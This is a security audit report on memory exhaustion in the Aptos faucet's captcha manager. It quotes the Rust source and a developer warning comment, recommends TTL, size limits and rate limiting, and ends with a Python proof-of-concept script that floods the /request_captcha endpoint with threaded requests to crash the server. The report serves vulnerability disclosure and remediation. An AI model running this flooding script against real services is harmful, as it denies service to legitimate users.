# Audit Report

## Title
Unbounded HashMap Growth in Faucet Captcha Manager Enables Memory Exhaustion DoS Attack

## Summary
The `CaptchaManager` in the Aptos faucet service stores captcha challenges in an unbounded `HashMap` without any expiration mechanism, size limits, or rate limiting on challenge creation. An attacker can repeatedly call the `/request_captcha` endpoint to continuously add entries to the HashMap, causing unbounded memory growth until the faucet server crashes due to OOM (Out of Memory).

## Finding Description
The vulnerability exists in the captcha challenge management system of the Aptos faucet service. The developers have explicitly acknowledged this issue with a warning comment [1](#0-0) 

The `CaptchaManager` struct maintains a `HashMap` to store captcha challenges [2](#0-1) 

When `create_challenge()` is called, it generates a new random key and inserts the captcha value into the HashMap [3](#0-2) 

The only cleanup mechanism is when a captcha is successfully verified [4](#0-3) 

The `/request_captcha` endpoint exposes this functionality without any rate limiting or authentication [5](#0-4) 

The endpoint registration shows no rate limiting middleware is applied globally [6](#0-5) 

**Attack Path:**
1. Attacker sends repeated GET requests to `/v1/request_captcha`
2. Each request creates a new HashMap entry with a random key
3. No expiration logic removes old entries
4. Failed verification attempts don't remove entries
5. HashMap grows continuously consuming memory
6. Eventually, the server exhausts available RAM and crashes (OOM)

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation
This vulnerability enables a **Denial of Service (DoS)** attack on the Aptos faucet service, which would:
- Prevent legitimate users from obtaining test tokens
- Require manual server restart to restore service
- Could be sustained with minimal attacker resources (simple HTTP client in a loop)

Per Aptos bug bounty categories, this aligns with **High Severity**: "API crashes" - the faucet API becomes unavailable when the server runs out of memory. While the faucet is an auxiliary service and doesn't directly affect blockchain consensus or validator operations, it is a critical developer tool for testnet operations.

## Likelihood Explanation
**Likelihood: High**

The attack is:
- **Trivially exploitable**: Requires only basic HTTP client capabilities
- **No authentication required**: The `/request_captcha` endpoint is publicly accessible
- **No rate limiting**: Can send unlimited requests
- **Low cost**: Attacker needs minimal bandwidth/resources
- **Acknowledged by developers**: The warning comment indicates developers are aware but haven't implemented a fix

A simple script making 1000+ requests per second could exhaust server memory within minutes to hours depending on available RAM.

## Recommendation

Implement multiple layers of defense:

1. **Add Time-To-Live (TTL) mechanism**: Automatically expire captcha challenges after a reasonable timeout (e.g., 5 minutes)

2. **Implement size limits**: Cap the HashMap at a maximum number of entries (e.g., 10,000) with LRU eviction

3. **Add rate limiting**: Apply IP-based rate limiting to the `/request_captcha` endpoint using existing rate limiter infrastructure

4. **Periodic cleanup**: Implement a background task that periodically removes expired challenges

**Example Fix** (pseudocode for TTL mechanism):
```rust
pub struct CaptchaChallenge {
    value: String,
    created_at: u64, // Unix timestamp
}

pub struct CaptchaManager {
    challenges: HashMap<u32, CaptchaChallenge>,
    ttl_seconds: u64,
    max_size: usize,
}

impl CaptchaManager {
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Clean expired entries before creating new one
        self.cleanup_expired();
        
        // Enforce size limit
        if self.challenges.len() >= self.max_size {
            return Err(anyhow!("Too many pending challenges"));
        }
        
        // ... rest of implementation
    }
    
    fn cleanup_expired(&mut self) {
        let now = get_current_time_secs();
        self.challenges.retain(|_, challenge| {
            now - challenge.created_at < self.ttl_seconds
        });
    }
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Memory exhaustion attack on Aptos faucet captcha endpoint
This script demonstrates unbounded HashMap growth by repeatedly
requesting captcha challenges without solving them.
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor

FAUCET_URL = "http://localhost:8081/v1/request_captcha"
NUM_THREADS = 10
REQUESTS_PER_THREAD = 10000

def request_captcha():
    """Request a captcha challenge (never solve it)"""
    try:
        response = requests.get(FAUCET_URL)
        if response.status_code == 200:
            captcha_key = response.headers.get('CAPTCHA_KEY')
            return f"Success: Got key {captcha_key}"
        else:
            return f"Failed: {response.status_code}"
    except Exception as e:
        return f"Error: {e}"

def attack_thread(thread_id):
    """Send many requests from a single thread"""
    print(f"Thread {thread_id} starting...")
    for i in range(REQUESTS_PER_THREAD):
        result = request_captcha()
        if i % 100 == 0:
            print(f"Thread {thread_id}: {i} requests sent")
    print(f"Thread {thread_id} completed {REQUESTS_PER_THREAD} requests")

def main():
    print(f"Starting attack with {NUM_THREADS} threads")
    print(f"Each thread will send {REQUESTS_PER_THREAD} requests")
    print(f"Total requests: {NUM_THREADS * REQUESTS_PER_THREAD}")
    print("Monitor server memory usage - it will grow without bound")
    print("-" * 60)
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(attack_thread, i) for i in range(NUM_THREADS)]
        for future in futures:
            future.result()
    
    elapsed = time.time() - start_time
    total_requests = NUM_THREADS * REQUESTS_PER_THREAD
    print(f"\nCompleted {total_requests} requests in {elapsed:.2f} seconds")
    print(f"Rate: {total_requests/elapsed:.2f} requests/second")
    print("\nServer memory should show significant growth.")
    print("HashMap now contains entries that will never be cleaned up.")

if __name__ == "__main__":
    main()
```

**Expected Behavior**: Server memory usage grows continuously and eventually crashes with OOM error when available RAM is exhausted.

## Notes

While this vulnerability affects an auxiliary service (the faucet) rather than core blockchain consensus, it represents a critical availability issue for Aptos testnet operations. The developers' explicit acknowledgment of the issue in code comments indicates awareness but not remediation, making this a high-priority fix despite being outside the core consensus path.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L4-6)
```rust
//! Warning: This could be attacked and cause the server to OOM because we
//! don't throw out captchas info if it has been sitting there for too long /
//! the map grows too large.
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L125-131)
```rust
#[derive(Debug, Default)]
pub struct CaptchaManager {
    /// When a challenge is created, we return to the client the captcha itself
    /// and a random key they must make the second request with. This is a map
    /// from that random key to the value of the captcha.
    challenges: HashMap<u32, String>,
}
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L142-162)
```rust
    pub fn create_challenge(&mut self) -> Result<(u32, Vec<u8>)> {
        // Generate a random key.
        let key = rand::thread_rng().gen_range(0, u32::MAX - 1);

        // Generate a captcha.
        let (name, image) = Captcha::new()
            .add_chars(5)
            .apply_filter(Noise::new(0.4))
            .apply_filter(Wave::new(4.0, 6.0).vertical())
            .apply_filter(Wave::new(3.0, 2.0).horizontal())
            .apply_filter(Grid::new(10, 6))
            .apply_filter(Dots::new(8))
            .as_tuple()
            .context("Failed to generate captcha")?;

        // Store the captcha information.
        self.challenges.insert(key, name);

        // Return (key, <captcha as base64>).
        Ok((key, image))
    }
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/captcha.rs (L40-58)
```rust
    async fn request_captcha(&self) -> Result<Response<Binary<Vec<u8>>>, AptosTapErrorResponse> {
        if !self.enabled {
            return Err(AptosTapError::new(
                "The CaptchaChecker is not enabled".to_string(),
                AptosTapErrorCode::EndpointNotEnabled,
            )
            .into());
        }
        let mut captcha_manager = self.captcha_manager.lock().await;
        let (key, image) = match captcha_manager.create_challenge() {
            Ok((key, image)) => (key, image),
            Err(e) => {
                return Err(
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError).into(),
                );
            },
        };
        Ok(Response::new(Binary(image)).header(CAPTCHA_KEY, key))
    }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L207-220)
```rust
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
        );
```
